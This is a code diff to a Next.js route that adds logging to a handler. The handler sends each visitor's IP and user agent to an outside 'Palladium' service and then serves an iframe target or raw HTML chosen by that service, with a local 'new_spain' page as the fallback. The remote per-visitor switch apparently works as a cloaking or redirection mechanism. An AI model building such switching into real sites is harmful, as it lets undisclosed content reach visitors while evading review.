@@ -19,6 +19,11 @@ export async function GET(req: NextRequest) {
   const ua = req.nextUrl.searchParams.get('ua') || ''
   const host = req.headers.get('host') || ''
 
+  console.log('[PALLADIUM] Request received')
+  console.log('[PALLADIUM] IP:', ip)
+  console.log('[PALLADIUM] UA:', ua)
+  console.log('[PALLADIUM] Host:', host)
+
   const payload = flattenPayload({
     server: {
       REMOTE_ADDR: ip,
@@ -45,11 +50,13 @@ export async function GET(req: NextRequest) {
     })
 
     const result = await res.json()
+    console.log('[PALLADIUM] Palladium response:', result)
 
     if (result?.result) {
       const { mode, target, content } = result
 
       if (mode === 1 && target) {
+        console.log('[PALLADIUM] Rendering iframe')
         const html = `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"></head><body style="margin:0"><iframe src="${target}" style="width:100%;height:100vh;border:none;"></iframe></body></html>`
         return new NextResponse(html, {
           status: 200,
@@ -58,6 +65,7 @@ export async function GET(req: NextRequest) {
       }
 
       if (mode === 4 && content) {
+        console.log('[PALLADIUM] Rendering content')
         return new NextResponse(content, {
           status: 200,
           headers: { 'Content-Type': 'text/html' },
@@ -65,7 +73,7 @@ export async function GET(req: NextRequest) {
       }
     }
   } catch (error) {
-    console.error('[__PALLADIUM] Error:', error)
+    console.error('[PALLADIUM] Error fetching from Palladium:', error)
   }
 
   // Fallback: load local file
@@ -75,6 +83,8 @@ export async function GET(req: NextRequest) {
     const filePath = join(process.cwd(), 'public', 'new_spain', 'index.html')
     const html = await fs.readFile(filePath, 'utf8')
 
+    console.log('[PALLADIUM] Fallback: serving static HTML')
+
     return new NextResponse(html, {
       status: 200,
       headers: {
@@ -83,7 +93,7 @@ export async function GET(req: NextRequest) {
       },
     })
   } catch (e) {
-    console.error('[__PALLADIUM] Failed to serve fallback:', e)
-    return new NextResponse('Fallback failed', { status: 500 })
+    console.error('[PALLADIUM] Fallback failed:', e)
+    return new NextResponse('Error loading fallback HTML', { status: 500 })
   }
 }
